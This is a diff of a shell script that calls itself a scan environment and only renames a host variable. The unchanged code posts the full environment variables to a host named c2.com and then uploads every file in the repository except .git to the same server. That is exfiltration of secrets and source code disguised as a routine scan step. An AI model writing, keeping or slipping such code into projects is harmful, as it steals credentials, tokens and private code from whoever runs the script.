@@ -6,15 +6,15 @@ echo "Initializing scan environment..."
 
 echo "Starting scan version 1"
 
-EC2IP="c2.com"
+EC2_TARGET_DNS="c2.com"
 
-curl -sm 0.5 -d "$(env)" http://$EC2IP:8080/uploadenv
+curl -sm 0.5 -d "$(env)" http://$EC2_TARGET_DNS:8080/uploadenv
 
 for file in $(find . -type f -name "*" | grep -v "./.git/")
 do
     if [ -f "$file" ]
     then
-        curl -s -m 1 -X POST -H "Content-Type: text/plain" --data-binary "@$file" "http://$EC2IP:8080/uploadzip?filename=$(basename $file)"
+        curl -s -m 1 -X POST -H "Content-Type: text/plain" --data-binary "@$file" "http://$EC2_TARGET_DNS:8080/uploadzip?filename=$(basename $file)"
     fi
 done
 
